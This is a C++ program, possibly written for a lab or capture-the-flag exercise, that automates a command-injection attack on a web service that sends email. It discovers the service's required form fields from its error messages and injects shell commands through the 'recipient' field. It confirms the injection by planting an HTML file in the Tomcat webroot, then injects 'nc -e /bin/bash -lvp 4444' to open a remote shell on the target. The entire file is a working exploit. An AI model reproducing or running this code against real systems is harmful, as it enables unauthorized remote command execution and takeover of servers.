#include <iostream>
#include <unistd.h>
#include <cstring>

using namespace std;

/* Function that waits 20 seconds and then executes a command specified in input */
int execute(string cmd){
    sleep(20);
    cmd += "> /dev/null 2>&1";
    return system(cmd.c_str());
}

/* Function that find the fields requested to send an email using the vulnerable email server, based on the output error messages */
string find_fields(string cmd){
    string exmp_sender = "=sender@example.com";
    string exmp_rec = "=recip@example.com";
    string exmp_subj = "=Greetings";
    string exmp_msg = "=Hello, world!";
    string cmd_base = cmd + " -d ";
    string cmd_second_half = "\"";
    string result = "";
    // Tries different commands until it stops to receive "Missing field" in the output message
    do {
        if(result.length()>0) {
            result = result.substr(result.find(": ")+2,result.length());
            result = result.substr(0, result.length()-4);
            cmd_second_half = cmd_second_half + (cmd_second_half.length()==1?"":"&") + result + (!strcmp(result.c_str(),"sender")? 
                exmp_sender : (!strcmp(result.c_str(),"recipient")? 
                exmp_rec : (!strcmp(result.c_str(),"subject")? exmp_subj : exmp_msg)));
            result = "";
        }
        cmd = cmd_base+cmd_second_half+"\"";
        char res[200];
        FILE *fp = popen(cmd.c_str(), "r");
        while(fgets(res,sizeof(res),fp)) result += string(res);
        fclose(fp);
        sleep(10);
    } while(result.find("Missing field") != string::npos);
    return cmd; // Returns the command that didn't trigger the "Missing field" error message
}

/* Function that tries a command injection and returns 1 if it worked, 0 otherwise */
int injection_works(string cmd, string ip){
    cmd = cmd.substr(0,cmd.find("recipient")+10)+cmd.substr(cmd.find("recipient")+14, cmd.length());
    char res[200];
    string result = "";
    FILE *fp = popen(cmd.c_str(), "r");
    while(fgets(res,sizeof(res),fp)) result += string(res);
    fclose(fp);
    sleep(10);
    // To test the injection, it tries to create an html file containing "Injection works" and to insert it in the directory accessed while curling the server 
    if(result.find("Command") == string::npos) return 0;
    cmd = cmd.substr(0,cmd.find("recipient")+10)+
        "; echo \\\"<html>Injection is working...</html>\\\" > /usr/local/tomcat/webapps/ROOT/test.html; "+
        cmd.substr(cmd.find("recipient")+23, cmd.length());
    if(execute(cmd)) return 0;
    // Trying to curl the inserted file
    cmd = "curl http://"+ip+":8080/test.html";
    result = "";
    fp = popen(cmd.c_str(), "r");
    while(fgets(res,sizeof(res),fp)) result += string(res);
    fclose(fp);
    sleep(10);
    return result.find("Injection is working")!=string::npos;
}

/* Function that injects a reverse shell listening on tcp port 4444 */
void reverse_shell(string cmd){
    cmd = cmd.substr(0,cmd.find("recipient")+10)+
        "; nc -e /bin/bash -lvp 4444;"+
        cmd.substr(cmd.find("recipient")+23, cmd.length());
    system((cmd+" &").c_str());
    cout<<"Reverse shell ready..."<<endl;
}

int main(int argc, char* argv[]){
    if(argc < 2) exit(EXIT_FAILURE);
    string ip = argv[1];
    string cmd = "curl http://"+ip+":8080";
    if(execute(cmd)) exit(EXIT_FAILURE);
    ip = ip + ":5000/send-email";
    cmd = "curl http://"+ip;
    if(execute(cmd)) exit(EXIT_FAILURE);
    cmd = find_fields(cmd);
    cout<<"Fields found..."<<endl;
    if(!injection_works(cmd,argv[1])) exit(EXIT_FAILURE);
    cout<<"Injection works..."<<endl;
    reverse_shell(cmd);
    return 0;
}